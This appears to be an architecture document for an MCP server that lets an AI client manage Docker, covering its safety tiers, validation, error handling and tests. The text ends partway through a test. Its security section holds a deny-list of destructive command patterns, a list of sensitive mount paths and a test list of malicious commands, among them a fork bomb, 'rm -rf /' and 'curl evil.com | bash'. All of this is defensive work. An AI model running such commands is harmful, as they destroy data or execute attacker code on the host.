# MCP Docker Server - Architecture and Design

## Table of Contents
- [1. Component Overview](#1-component-overview)
- [2. Design Principles](#2-design-principles)
- [3. Type Safety Approach](#3-type-safety-approach)
- [4. Error Handling Strategy](#4-error-handling-strategy)
- [5. Testing Philosophy](#5-testing-philosophy)
- [6. Security Considerations](#6-security-considerations)
- [7. Performance Characteristics](#7-performance-characteristics)
- [8. Future Enhancements](#8-future-enhancements)

---

## 1. Component Overview

### 1.1 High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        MCP Client (Claude)                       │
│                    (Model Context Protocol)                      │
└────────────────────────────┬────────────────────────────────────┘
                             │ stdio transport
                             │ JSON-RPC messages
                             ↓
┌─────────────────────────────────────────────────────────────────┐
│                      MCPDockerServer                            │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐         │
│  │   Tools      │  │  Resources   │  │   Prompts    │         │
│  │  (37 tools)  │  │  (logs/stats)│  │ (templates)  │         │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘         │
│         │                  │                  │                  │
│         └──────────────────┼──────────────────┘                  │
│                            ↓                                     │
│              ┌──────────────────────────┐                       │
│              │  DockerClientWrapper     │                       │
│              │  (Connection Management) │                       │
│              └──────────┬───────────────┘                       │
└───────────────────────────┼─────────────────────────────────────┘
                            │
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│                     Docker SDK (docker-py)                       │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ↓
┌─────────────────────────────────────────────────────────────────┐
│              Docker Daemon (dockerd)                            │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐       │
│  │Containers│  │  Images  │  │ Networks │  │ Volumes  │       │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘       │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2 Module Structure and Responsibilities

```
src/mcp_docker/
├── server.py              # MCP server orchestration
│   └── MCPDockerServer    # Main server class, tool/resource/prompt registration
│
├── config.py              # Configuration management
│   ├── DockerConfig       # Docker client settings
│   ├── SafetyConfig       # Safety controls and limits
│   └── ServerConfig       # Logging and server metadata
│
├── docker/
│   ├── client.py          # Docker client wrapper
│   │   └── DockerClientWrapper  # Connection management, health checks, context manager
│
├── tools/
│   ├── base.py            # Tool abstractions
│   │   ├── BaseTool       # Abstract base class for all tools
│   │   ├── ToolInput      # Pydantic base model for inputs
│   │   ├── ToolResult     # Standardized result format
│   │   └── OperationSafety # Enum (SAFE/MODERATE/DESTRUCTIVE)
│   │
│   ├── container_tools.py # 10 container management tools
│   ├── image_tools.py     # 9 image management tools
│   ├── network_tools.py   # 6 network management tools
│   ├── volume_tools.py    # 5 volume management tools
│   └── system_tools.py    # 7 system-level tools
│
├── resources/
│   └── providers.py       # MCP resource providers
│       ├── ContainerLogsResource    # container://logs/{id}
│       └── ContainerStatsResource   # container://stats/{id}
│
├── prompts/
│   └── templates.py       # MCP prompt templates
│       ├── TroubleshootContainerPrompt  # Diagnostic assistance
│       ├── OptimizeContainerPrompt      # Optimization suggestions
│       └── GenerateComposePrompt        # docker-compose.yml generation
│
└── utils/
    ├── errors.py          # Exception hierarchy
    ├── validation.py      # Input validation (Pydantic)
    ├── safety.py          # Safety controls and command sanitization
    └── logger.py          # Structured logging (loguru)
```

### 1.3 Data Flow Diagram

#### Tool Execution Flow

```
┌──────────────┐
│ MCP Client   │
│ (Claude)     │
└──────┬───────┘
       │ 1. call_tool("docker_list_containers", {...})
       ↓
┌──────────────────────┐
│ MCPDockerServer      │
│ .call_tool()         │
└──────┬───────────────┘
       │ 2. Lookup tool by name
       ↓
┌──────────────────────┐
│ ListContainersTool   │
│ (BaseTool)           │
└──────┬───────────────┘
       │ 3. Validate input (Pydantic)
       ↓
┌──────────────────────┐
│ Safety Check         │
│ .check_safety()      │
└──────┬───────────────┘
       │ 4. Check operation level (SAFE)
       ↓
┌──────────────────────┐
│ Tool Implementation  │
│ .execute()           │
└──────┬───────────────┘
       │ 5. Call Docker API
       ↓
┌──────────────────────┐
│ DockerClientWrapper  │
│ .client              │
└──────┬───────────────┘
       │ 6. Lazy connect, health check
       ↓
┌──────────────────────┐
│ Docker SDK           │
│ containers.list()    │
└──────┬───────────────┘
       │ 7. API call to daemon
       ↓
┌──────────────────────┐
│ Docker Daemon        │
│ GET /containers/json │
└──────┬───────────────┘
       │ 8. Return container data
       ↓
┌──────────────────────┐
│ Tool Result          │
│ ToolResult.success() │
└──────┬───────────────┘
       │ 9. Format response
       ↓
┌──────────────────────┐
│ MCP Client           │
│ (Result JSON)        │
└──────────────────────┘
```

### 1.4 Component Interactions

```
┌──────────────────────────────────────────────────────────────────┐
│                        Configuration Layer                        │
│  ┌──────────┐  ┌──────────────┐  ┌──────────────┐              │
│  │  Docker  │  │    Safety    │  │    Server    │              │
│  │  Config  │  │    Config    │  │    Config    │              │
│  └────┬─────┘  └──────┬───────┘  └──────┬───────┘              │
└───────┼────────────────┼──────────────────┼────────────────────┘
        │                │                  │
        ↓                ↓                  ↓
┌──────────────────────────────────────────────────────────────────┐
│                         Server Layer                             │
│  ┌────────────────────────────────────────────────────┐          │
│  │              MCPDockerServer                       │          │
│  │  - Tool Registration                               │          │
│  │  - Resource Management                             │          │
│  │  - Prompt Management                               │          │
│  │  - Lifecycle Management (start/stop)               │          │
│  └─────────────────────┬──────────────────────────────┘          │
└────────────────────────┼─────────────────────────────────────────┘
                         │
        ┌────────────────┼────────────────┐
        │                │                │
        ↓                ↓                ↓
┌──────────────┐  ┌──────────────┐  ┌──────────────┐
│ Tool Layer   │  │ Resource     │  │ Prompt       │
│              │  │ Layer        │  │ Layer        │
│ - 37 Tools   │  │              │  │              │
│ - BaseTool   │  │ - Logs       │  │ - Templates  │
│ - Safety     │  │ - Stats      │  │ - Generation │
│ - Validation │  │ - URI scheme │  │              │
└──────┬───────┘  └──────┬───────┘  └──────┬───────┘
       │                 │                 │
       └─────────────────┼─────────────────┘
                         ↓
┌──────────────────────────────────────────────────────────────────┐
│                     Docker Client Layer                          │
│  ┌────────────────────────────────────────────────────┐          │
│  │           DockerClientWrapper                      │          │
│  │  - Lazy Initialization                             │          │
│  │  - Health Checks                                   │          │
│  │  - Connection Pooling                              │          │
│  │  - Context Manager                                 │          │
│  └─────────────────────┬──────────────────────────────┘          │
└────────────────────────┼─────────────────────────────────────────┘
                         ↓
┌──────────────────────────────────────────────────────────────────┐
│                   Utility Layer (Cross-Cutting)                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐        │
│  │  Errors  │  │Validation│  │  Safety  │  │  Logger  │        │
│  │          │  │          │  │          │  │          │        │
│  │ Custom   │  │ Pydantic │  │ Command  │  │ Loguru   │        │
│  │ Exception│  │ Models   │  │ Sanitize │  │ Struct.  │        │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘        │
└──────────────────────────────────────────────────────────────────┘
```

---

## 2. Design Principles

### 2.1 Core Philosophy

The MCP Docker Server is built on several key design principles that guide all architectural decisions:

1. **Type Safety First**: Leverage Python's type system with strict mypy checking
2. **Defense in Depth**: Multiple layers of validation and safety checks
3. **Fail Fast, Fail Clearly**: Early detection with actionable error messages
4. **Composability**: Small, focused components that work together
5. **Developer Experience**: Clear APIs, comprehensive documentation, helpful errors
6. **Production Ready**: Built for reliability, security, and observability

### 2.2 Key Architectural Decisions

#### Decision: Lazy Initialization of Docker Client

**Rationale**: Docker daemon may not be available at server startup, or configuration may need to be validated before connecting.

**Implementation**:
```python
@property
def client(self) -> DockerClient:
    """Get Docker client with lazy initialization."""
    if self._client is None:
        self._connect()
    return self._client
```

**Trade-offs**:
- Pro: Server can start even if Docker is unavailable
- Pro: Configuration can be validated before connection
- Pro: Faster server startup
- Con: First tool call incurs connection overhead
- Con: Connection errors happen at runtime, not startup

**Mitigation**: Health check performed during server start to warn of issues.

#### Decision: Three-Tier Safety System

**Rationale**: Different operations have different risk profiles and should be controlled accordingly.

**Implementation**:
```python
class OperationSafety(str, Enum):
    SAFE = "safe"          # Read-only, always allowed
    MODERATE = "moderate"  # State-changing, usually safe
    DESTRUCTIVE = "destructive"  # Permanent, requires permission
```

**Categories**:
- **SAFE**: `list_containers`, `inspect_image`, `container_logs`, `system_info`
- **MODERATE**: `create_container`, `start_container`, `stop_container`, `pull_image`
- **DESTRUCTIVE**: `remove_container`, `prune_images`, `system_prune`

**Trade-offs**:
- Pro: Fine-grained control over dangerous operations
- Pro: Clear communication of operation risk
- Pro: Prevents accidental data loss
- Con: Adds configuration complexity
- Con: May require user intervention for legitimate operations

**Mitigation**: Clear error messages explaining how to enable operations.

#### Decision: Pydantic for All Input Validation

**Rationale**: Runtime validation is critical for security and reliability when accepting external input.

**Implementation**:
```python
class CreateContainerInput(BaseModel):
    image: str = Field(description="Image name")
    name: str | None = Field(default=None, description="Container name")
    command: str | list[str] | None = Field(default=None)

    @field_validator('name')
    @classmethod
    def validate_name(cls, v: str | None) -> str | None:
        if v is not None:
            validate_container_name(v)
        return v
```

**Benefits**:
- Runtime type checking
- Automatic JSON schema generation for MCP
- Clear validation errors with field context
- Self-documenting code

**Trade-offs**:
- Pro: Catches invalid input before it reaches Docker
- Pro: Consistent validation across all tools
- Pro: Better error messages than Docker API errors
- Con: Additional validation overhead (~1-5ms per call)
- Con: Adds dependency on Pydantic

#### Decision: Async-First Design

**Rationale**: Docker operations are I/O-bound and benefit from async execution.

**Implementation**:
```python
async def execute(self, arguments: dict[str, Any]) -> ToolResult:
    """Execute tool asynchronously."""
    # Docker SDK is synchronous, but we're ready for async operations
    result = await self._run_operation(arguments)
    return result
```

**Current State**: Docker SDK is synchronous, but all tool interfaces are async.

**Future-Proofing**:
- Ready for async Docker client (when available)
- Enables concurrent tool execution
- Compatible with MCP async protocol
- Allows non-blocking I/O operations

**Trade-offs**:
- Pro: Future-proof for async Docker SDK
- Pro: Enables concurrent operations
- Pro: Better resource utilization
- Con: Adds async/await complexity
- Con: Current implementation blocks on sync Docker calls

#### Decision: Composition Over Inheritance

**Rationale**: Tools should be composed of reusable components rather than inheriting complex behavior.

**Pattern**:
```python
class ListContainersTool:
    def __init__(
        self,
        docker_client: DockerClientWrapper,  # Composition
        safety_config: SafetyConfig,         # Composition
    ):
        self.docker = docker_client
        self.safety = safety_config
```

**Benefits**:
- Easier to test (mock dependencies)
- Clearer dependencies
- More flexible (swap implementations)
- Better separation of concerns

**Trade-offs**:
- Pro: Testability and maintainability
- Pro: Clear dependency injection
- Con: More boilerplate in constructors
- Con: Requires dependency management

#### Decision: Centralized Error Hierarchy

**Rationale**: Consistent error handling and clear error types improve debugging and client experience.

**Hierarchy**:
```python
MCPDockerError (base)
├── DockerConnectionError
├── DockerHealthCheckError
├── DockerOperationError
├── ValidationError
├── SafetyError
│   └── UnsafeOperationError
├── ContainerNotFound
├── ImageNotFound
├── NetworkNotFound
└── VolumeNotFound
```

**Benefits**:
- Catch errors by category
- Clear error semantics
- Consistent error messages
- Better error propagation

### 2.3 Design Patterns Used

#### Pattern: Context Manager for Resource Management

**Usage**:
```python
with docker_client.acquire() as client:
    containers = client.containers.list()
# Client automatically released
```

**Benefits**:
- Guaranteed cleanup
- Clear resource lifecycle
- Exception-safe

#### Pattern: Factory Methods for Results

**Usage**:
```python
# Success case
return ToolResult.success_result(
    data=containers,
    total_count=len(containers)
)

# Error case
return ToolResult.error_result(
    error="Container not found",
    container_id=container_id
)
```

**Benefits**:
- Consistent result format
- Type-safe construction
- Clear success/failure semantics

#### Pattern: Strategy Pattern for Validation

**Usage**:
```python
# Different validation strategies
validate_container_name(name)
validate_image_name(image)
validate_port(port)
validate_memory(memory)
```

**Benefits**:
- Reusable validation logic
- Composable validators
- Easy to extend

---

## 3. Type Safety Approach

### 3.1 Type System Architecture

The project uses a comprehensive type safety strategy with three layers:

```
┌──────────────────────────────────────────────────────┐
│           Layer 1: Static Type Checking              │
│                    (mypy --strict)                   │
│  - All functions have type hints                     │
│  - No implicit Any types                             │
│  - Return types always specified                     │
└────────────────────┬─────────────────────────────────┘
                     ↓
┌──────────────────────────────────────────────────────┐
│        Layer 2: Runtime Validation                   │
│              (Pydantic Models)                       │
│  - Input validation before execution                 │
│  - Automatic type coercion                           │
│  - Field-level validators                            │
└────────────────────┬─────────────────────────────────┘
                     ↓
┌──────────────────────────────────────────────────────┐
│       Layer 3: Domain Validation                     │
│          (Custom Validators)                         │
│  - Business logic validation                         │
│  - Docker-specific constraints                       │
│  - Safety checks                                     │
└──────────────────────────────────────────────────────┘
```

### 3.2 Type Hints Strategy

**Configuration**: `pyproject.toml`
```toml
[tool.mypy]
python_version = "3.11"
strict = true
warn_return_any = true
warn_unused_configs = true
disallow_untyped_defs = true
disallow_any_generics = true
check_untyped_defs = true
no_implicit_optional = true
```

**Example: Fully Typed Tool**:
```python
from typing import Any
from pydantic import BaseModel, Field
from docker import DockerClient

class ListContainersInput(BaseModel):
    """Type-safe input model."""
    all: bool = Field(default=False)
    filters: dict[str, str | list[str]] | None = Field(default=None)

class ListContainersOutput(BaseModel):
    """Type-safe output model."""
    containers: list[dict[str, Any]] = Field(description="Container list")
    count: int = Field(description="Total count")

class ListContainersTool:
    """Fully typed tool implementation."""

    def __init__(
        self,
        docker_client: DockerClientWrapper,
        safety_config: SafetyConfig,
    ) -> None:
        self.docker = docker_client
        self.safety = safety_config

    async def execute(
        self,
        input_data: ListContainersInput,
    ) -> ListContainersOutput:
        """Execute with type-safe inputs and outputs."""
        with self.docker.acquire() as client:
            containers = client.containers.list(
                all=input_data.all,
                filters=input_data.filters or {}
            )

        return ListContainersOutput(
            containers=[self._format_container(c) for c in containers],
            count=len(containers)
        )

    def _format_container(self, container: Any) -> dict[str, Any]:
        """Format container data."""
        return {
            "id": container.id,
            "name": container.name,
            "status": container.status,
            "image": container.image.tags[0] if container.image.tags else None,
        }
```

### 3.3 Pydantic Integration

**Benefits of Pydantic**:
1. **Runtime Type Validation**: Catches type errors at runtime
2. **Automatic JSON Schema**: Generates MCP tool schemas automatically
3. **Data Coercion**: Converts compatible types automatically
4. **Validation Errors**: Provides detailed error messages with field paths
5. **Serialization**: Easy conversion to/from JSON

**Example: Field Validation**:
```python
class CreateContainerInput(BaseModel):
    image: str = Field(description="Image name to create container from")
    name: str | None = Field(default=None, description="Optional container name")
    mem_limit: str | None = Field(default=None, description="Memory limit (e.g., '512m')")

    @field_validator('name')
    @classmethod
    def validate_container_name(cls, v: str | None) -> str | None:
        """Validate container name format."""
        if v is not None:
            if not CONTAINER_NAME_PATTERN.match(v):
                raise ValueError(
                    f"Invalid container name: {v}. "
                    "Must contain only alphanumeric, underscore, period, hyphen"
                )
        return v

    @field_validator('mem_limit')
    @classmethod
    def validate_memory(cls, v: str | None) -> str | None:
        """Validate memory limit format."""
        if v is not None:
            if not re.match(r'^\d+[bkmg]?$', v, re.IGNORECASE):
                raise ValueError(
                    f"Invalid memory format: {v}. "
                    "Must be a number followed by b, k, m, or g"
                )
        return v
```

### 3.4 Type Safety Benefits

**Example: Type-Safe Error Handling**:
```python
from mcp_docker.utils.errors import (
    ContainerNotFound,
    DockerOperationError,
    ValidationError,
)

async def get_container_logs(
    container_id: str,
    tail: int = 100,
) -> str:
    """Get container logs with type-safe error handling."""
    try:
        container = docker_client.containers.get(container_id)
        logs: bytes = container.logs(tail=tail)
        return logs.decode('utf-8')
    except NotFound as e:
        # Docker SDK error -> Custom error
        raise ContainerNotFound(
            f"Container {container_id} not found"
        ) from e
    except APIError as e:
        # Docker API error -> Custom error
        raise DockerOperationError(
            f"Failed to get logs: {e}"
        ) from e
```

**Type Checker Coverage**:
- **Core modules**: 100% type coverage
- **Tests**: Pragmatic typing (mocks may use Any)
- **External libraries**: Type stubs where available

---

## 4. Error Handling Strategy

### 4.1 Error Hierarchy

```
MCPDockerError (Base Exception)
│
├── DockerConnectionError
│   └── "Cannot connect to Docker daemon at unix:///var/run/docker.sock"
│   └── Solution: Check Docker is running
│
├── DockerHealthCheckError
│   └── "Health check failed: daemon not responding"
│   └── Solution: Restart Docker daemon
│
├── DockerOperationError
│   └── "Operation failed: container already exists"
│   └── Solution: Use different name or remove existing container
│
├── ValidationError
│   └── "Invalid container name: must not start with hyphen"
│   └── Solution: Fix the input according to validation rules
│
├── SafetyError
│   ├── UnsafeOperationError
│   │   └── "Destructive operation not allowed"
│   │   └── Solution: Set SAFETY_ALLOW_DESTRUCTIVE_OPERATIONS=true
│   └── "Command contains dangerous pattern: rm -rf /"
│       └── Solution: Modify command or review safety settings
│
└── Resource Not Found (4 types)
    ├── ContainerNotFound
    ├── ImageNotFound
    ├── NetworkNotFound
    └── VolumeNotFound
```

### 4.2 Error Propagation Strategy

**Principle**: Transform low-level errors into high-level, actionable errors.

```python
# Layer 1: Docker SDK raises low-level errors
try:
    container = client.containers.get(container_id)
except docker.errors.NotFound as e:
    # Layer 2: Transform to domain error
    raise ContainerNotFound(
        f"Container '{container_id}' not found. "
        f"Use docker_list_containers to see available containers."
    ) from e
except docker.errors.APIError as e:
    # Layer 3: Transform to operation error
    raise DockerOperationError(
        f"Docker API error: {e.explanation}"
    ) from e
```

**Error Context**: Always preserve the error chain with `from e`.

### 4.3 Tool-Level Error Handling

**Pattern**: Catch all exceptions and return structured errors.

```python
async def execute(self, input_data: ToolInput) -> ToolResult:
    """Execute tool with comprehensive error handling."""
    try:
        # Safety check
        self.check_safety()

        # Execute operation
        result = await self._perform_operation(input_data)

        # Success result
        return ToolResult.success_result(
            data=result,
            operation_time=time.time() - start_time
        )

    except ContainerNotFound as e:
        # Specific resource not found
        logger.error(f"Container not found: {e}")
        return ToolResult.error_result(
            error=str(e),
            error_type="ContainerNotFound",
            suggestion="Use docker_list_containers to see available containers"
        )

    except UnsafeOperationError as e:
        # Safety violation
        logger.warning(f"Unsafe operation blocked: {e}")
        return ToolResult.error_result(
            error=str(e),
            error_type="UnsafeOperationError",
            suggestion="Enable destructive operations in configuration"
        )

    except ValidationError as e:
        # Input validation failed
        logger.error(f"Validation error: {e}")
        return ToolResult.error_result(
            error=str(e),
            error_type="ValidationError",
            suggestion="Check input format and try again"
        )

    except Exception as e:
        # Unexpected error
        logger.exception(f"Unexpected error in {self.name}: {e}")
        return ToolResult.error_result(
            error=f"Unexpected error: {type(e).__name__}: {e}",
            error_type="InternalError",
            suggestion="Check logs for details"
        )
```

### 4.4 Error Message Design

**Principles**:
1. **Be Specific**: What went wrong?
2. **Be Actionable**: How to fix it?
3. **Provide Context**: What was being attempted?
4. **Suggest Next Steps**: What to do next?

**Example: Good Error Message**:
```python
raise ValidationError(
    f"Invalid container name: '{name}'. "
    f"Container names must start with an alphanumeric character "
    f"and can only contain letters, numbers, underscores, periods, and hyphens. "
    f"Example: 'my-container-1' or 'app_server'"
)
```

**Example: Bad Error Message**:
```python
raise ValidationError("Invalid name")  # Too vague!
```

### 4.5 Logging Strategy

**Log Levels**:
- **DEBUG**: Detailed diagnostic information (input/output, API calls)
- **INFO**: Normal operations (tool execution, connection status)
- **WARNING**: Unexpected but handled situations (health check failures, safety warnings)
- **ERROR**: Errors that affect single operations (container not found, API errors)
- **CRITICAL**: Errors that affect entire server (daemon unavailable, fatal configuration)

**Example**:
```python
# DEBUG: Input details
logger.debug(f"Executing {self.name} with input: {input_data}")

# INFO: Normal operation
logger.info(f"Tool {self.name} executed successfully")

# WARNING: Safety concern
logger.warning(
    f"Destructive operation '{self.name}' requires confirmation"
)

# ERROR: Operation failed
logger.error(f"Failed to execute {self.name}: {e}")

# CRITICAL: Server-level issue
logger.critical(f"Cannot connect to Docker daemon: {e}")
```

---

## 5. Testing Philosophy

### 5.1 Testing Pyramid

```
         ┌─────────────┐
        ╱               ╲
       ╱   E2E Tests    ╲      10% - Full MCP protocol integration
      ╱   (5-10 tests)   ╲
     └─────────────────────┘
            ╱           ╲
           ╱ Integration ╲       20% - Real Docker operations
          ╱    Tests      ╲
         ╱  (20-30 tests)  ╲
        └───────────────────┘
               ╱       ╲
              ╱  Unit   ╲          70% - Fast, isolated tests
             ╱   Tests   ╲
            ╱ (100+ tests)╲
           └───────────────┘
```

### 5.2 Unit Testing Strategy

**Philosophy**: Fast, isolated, comprehensive.

**Characteristics**:
- Mock all external dependencies (Docker client, filesystem)
- Test one component at a time
- Fast execution (<1ms per test)
- 90%+ code coverage target

**Example: Unit Test with Mocks**:
```python
@pytest.mark.unit
async def test_list_containers_success(mock_docker_client):
    """Test listing containers with mocked Docker client."""
    # Setup: Mock Docker response
    mock_container = MagicMock()
    mock_container.id = "abc123"
    mock_container.name = "test-container"
    mock_container.status = "running"
    mock_docker_client.containers.list.return_value = [mock_container]

    # Create tool with mocked client
    tool = ListContainersTool(
        docker_client=mock_docker_client,
        safety_config=SafetyConfig()
    )

    # Execute
    result = await tool.execute({"all": False})

    # Assert
    assert result.success is True
    assert len(result.data["containers"]) == 1
    assert result.data["containers"][0]["id"] == "abc123"

    # Verify mock was called correctly
    mock_docker_client.containers.list.assert_called_once_with(
        all=False,
        filters={}
    )
```

### 5.3 Integration Testing Strategy

**Philosophy**: Test real Docker operations in isolated environments.

**Characteristics**:
- Use real Docker daemon
- Clean up resources after each test
- Test tool integration with Docker SDK
- Slower execution (~100-500ms per test)

**Example: Integration Test**:
```python
@pytest.mark.integration
async def test_container_lifecycle(docker_client_wrapper, integration_test_config):
    """Test complete container lifecycle with real Docker."""
    # Skip if Docker not available
    pytest.skip_if_no_docker()

    # Create container
    create_tool = CreateContainerTool(docker_client_wrapper)
    create_result = await create_tool.execute({
        "image": "alpine:latest",
        "name": "test-lifecycle-container",
        "command": ["sleep", "infinity"]
    })
    assert create_result.success is True
    container_id = create_result.data["container_id"]

    try:
        # Start container
        start_tool = StartContainerTool(docker_client_wrapper)
        start_result = await start_tool.execute({"container_id": container_id})
        assert start_result.success is True

        # Verify running
        inspect_tool = InspectContainerTool(docker_client_wrapper)
        inspect_result = await inspect_tool.execute({"container_id": container_id})
        assert inspect_result.data["State"]["Running"] is True

        # Stop container
        stop_tool = StopContainerTool(docker_client_wrapper)
        stop_result = await stop_tool.execute({"container_id": container_id})
        assert stop_result.success is True

    finally:
        # Cleanup
        remove_tool = RemoveContainerTool(docker_client_wrapper)
        await remove_tool.execute({"container_id": container_id, "force": True})
```

### 5.4 Test Fixtures

**Shared Test Infrastructure**:
```python
# tests/conftest.py

@pytest.fixture
def docker_config() -> DockerConfig:
    """Provide test Docker configuration."""
    return DockerConfig(
        base_url="unix:///var/run/docker.sock",
        timeout=30
    )

@pytest.fixture
def safety_config() -> SafetyConfig:
    """Provide test safety configuration."""
    return SafetyConfig(
        allow_destructive_operations=True,  # Allow for tests
        allow_privileged_containers=False,
        require_confirmation_for_destructive=False
    )

@pytest.fixture
def mock_docker_client() -> MagicMock:
    """Provide mock Docker client."""
    mock = MagicMock(spec=DockerClient)
    mock.ping.return_value = True
    mock.info.return_value = {"Containers": 5, "Images": 10}
    return mock

@pytest.fixture
async def test_container(docker_client_wrapper):
    """Provide a test container that's automatically cleaned up."""
    container = docker_client_wrapper.client.containers.run(
        "alpine:latest",
        command=["sleep", "infinity"],
        detach=True,
        name=f"test-{uuid.uuid4()}"
    )

    yield container

    # Cleanup
    container.stop()
    container.remove()
```

### 5.5 Performance Testing

**Benchmarks**: Track operation performance over time.

```python
@pytest.mark.performance
def test_list_containers_performance(benchmark, docker_client_wrapper):
    """Benchmark container listing performance."""
    tool = ListContainersTool(docker_client_wrapper)

    # Benchmark the operation
    result = benchmark(
        lambda: asyncio.run(tool.execute({"all": False}))
    )

    # Performance assertions
    assert result.success is True
    assert benchmark.stats.mean < 0.1  # <100ms average
    assert benchmark.stats.max < 0.5   # <500ms worst case
```

### 5.6 Coverage Strategy

**Coverage Targets**:
- **Overall**: 90%+ coverage
- **Core modules** (`server.py`, `tools/`, `docker/`): 95%+ coverage
- **Utilities** (`utils/`): 95%+ coverage
- **Tests**: No coverage requirement

**Coverage Configuration**:
```toml
[tool.coverage.run]
source = ["src"]
omit = ["tests/*", "**/__pycache__/*"]

[tool.coverage.report]
exclude_lines = [
    "pragma: no cover",
    "def __repr__",
    "if TYPE_CHECKING:",
    "raise NotImplementedError",
]
```

**Coverage Reporting**:
```bash
# Run tests with coverage
uv run pytest --cov=mcp_docker --cov-report=html --cov-report=term

# View coverage report
open htmlcov/index.html
```

---

## 6. Security Considerations

### 6.1 Threat Model

**Assets to Protect**:
1. Host system (files, processes, resources)
2. Docker daemon and containers
3. User data and credentials
4. Network resources

**Threat Actors**:
1. Malicious AI prompts (command injection)
2. Compromised MCP client
3. Accidental destructive operations
4. Privileged container escapes

**Attack Vectors**:
1. Command injection via `exec_command`
2. Path traversal via volume mounts
3. Privilege escalation via privileged containers
4. Resource exhaustion via container creation
5. Data exfiltration via logs/stats

### 6.2 Security Controls

#### 6.2.1 Three-Tier Safety System

```python
class OperationSafety(str, Enum):
    """Security classification of operations."""
    SAFE = "safe"          # No security risk
    MODERATE = "moderate"  # Controlled risk
    DESTRUCTIVE = "destructive"  # High risk
```

**Configuration**:
```python
class SafetyConfig(BaseSettings):
    allow_destructive_operations: bool = Field(default=False)
    allow_privileged_containers: bool = Field(default=False)
    require_confirmation_for_destructive: bool = Field(default=True)
    max_concurrent_operations: int = Field(default=10, gt=0, le=100)
```

**Enforcement**:
```python
def check_safety(self) -> None:
    """Enforce safety controls."""
    if self.safety_level == OperationSafety.DESTRUCTIVE:
        if not self.safety.allow_destructive_operations:
            raise PermissionError(
                f"Destructive operation '{self.name}' is not allowed. "
                "Set SAFETY_ALLOW_DESTRUCTIVE_OPERATIONS=true to enable."
            )
```

#### 6.2.2 Command Sanitization

**Dangerous Pattern Detection**:
```python
DANGEROUS_COMMAND_PATTERNS = [
    r"rm\s+-rf\s+/",           # Recursive deletion from root
    r":\(\)\{\s*:\|:&\s*\};:",  # Fork bomb
    r"dd\s+if=/dev/(zero|random)",  # Disk filling
    r"mkfs\.",                  # Filesystem creation
    r"fdisk",                   # Partition management
    r"shutdown",                # System shutdown
    r"reboot",                  # System reboot
    r"halt",                    # System halt
    r"init\s+[06]",            # Init level change
    r"curl.*\|\s*bash",        # Piping to shell
    r"wget.*\|\s*sh",          # Piping to shell
]

def sanitize_command(command: str | list[str]) -> list[str]:
    """Sanitize command for safe execution."""
    command_str = " ".join(command) if isinstance(command, list) else command

    for pattern in DANGEROUS_COMMAND_PATTERNS:
        if re.search(pattern, command_str, re.IGNORECASE):
            raise UnsafeOperationError(
                f"Command contains dangerous pattern: {pattern}"
            )

    return [command] if isinstance(command, str) else command
```

#### 6.2.3 Path Validation

**Sensitive Path Protection**:
```python
def validate_mount_path(path: str, allowed_paths: list[str] | None = None) -> None:
    """Validate mount paths to prevent sensitive file access."""
    dangerous_paths = [
        "/etc/passwd",
        "/etc/shadow",
        "/root/.ssh",
        "/home/.ssh",
        "/.ssh",
    ]

    for dangerous_path in dangerous_paths:
        if path.startswith(dangerous_path):
            raise UnsafeOperationError(
                f"Mount path '{path}' is not allowed. "
                f"Mounting sensitive system paths is blocked."
            )

    if allowed_paths and not any(path.startswith(allowed) for allowed in allowed_paths):
        raise UnsafeOperationError(
            f"Mount path '{path}' is not in allowed paths list"
        )
```

#### 6.2.4 Privileged Port Protection

```python
def validate_port_binding(
    host_port: int,
    allow_privileged_ports: bool = False,
) -> None:
    """Prevent binding to privileged ports without permission."""
    if host_port < 1024 and not allow_privileged_ports:
        raise UnsafeOperationError(
            f"Privileged port {host_port} (<1024) is not allowed. "
            "Enable privileged ports in configuration or use port >= 1024."
        )
```

#### 6.2.5 Input Validation

**Container Name Validation**:
```python
CONTAINER_NAME_PATTERN = re.compile(r"^/?[a-zA-Z0-9][a-zA-Z0-9_.-]*$")

def validate_container_name(name: str) -> str:
    """Validate container name against Docker requirements."""
    if not name:
        raise ValidationError("Container name cannot be empty")

    if len(name) > 255:
        raise ValidationError("Container name cannot exceed 255 characters")

    if not CONTAINER_NAME_PATTERN.match(name):
        raise ValidationError(
            f"Invalid container name: {name}. "
            "Must contain only alphanumeric, underscore, period, hyphen. "
            "Cannot start with hyphen or period."
        )

    return name
```

**Image Name Validation**:
```python
IMAGE_NAME_PATTERN = re.compile(
    r"^(?:(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)*"
    r"[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?(?::[0-9]{1,5})?/)?"
    r"(?:[a-z0-9]+(?:[._-][a-z0-9]+)*/)*"
    r"[a-z0-9]+(?:[._-][a-z0-9]+)*"
    r"(?::[a-zA-Z0-9_][a-zA-Z0-9_.-]{0,127})?$"
)
```

### 6.3 Security Best Practices

**Default Security Posture**:
```python
# Default configuration is secure
SAFETY_ALLOW_DESTRUCTIVE_OPERATIONS=false
SAFETY_ALLOW_PRIVILEGED_CONTAINERS=false
SAFETY_REQUIRE_CONFIRMATION_FOR_DESTRUCTIVE=true
```

**Principle of Least Privilege**:
- Tools only have access to their specific Docker operations
- No root access required in container
- Docker socket permissions control access

**Defense in Depth**:
1. **Input validation** (Pydantic)
2. **Command sanitization** (pattern matching)
3. **Safety checks** (operation classification)
4. **Docker daemon permissions** (socket access)
5. **Resource limits** (max concurrent operations)

### 6.4 Security Testing

**Security Test Cases**:
```python
@pytest.mark.security
async def test_command_injection_blocked():
    """Test that command injection attempts are blocked."""
    tool = ExecCommandTool(docker_client)

    malicious_commands = [
        "rm -rf /",
        ":(){ :|:& };:",
        "curl evil.com | bash",
        "shutdown -h now",
    ]

    for cmd in malicious_commands:
        with pytest.raises(UnsafeOperationError):
            await tool.execute({
                "container_id": "test",
                "command": cmd
            })

@pytest.mark.security
async def test_privileged_container_blocked():
    """Test that privileged containers are blocked by default."""
    tool = CreateContainerTool(docker_client)

    with pytest.raises(UnsafeOperationError):
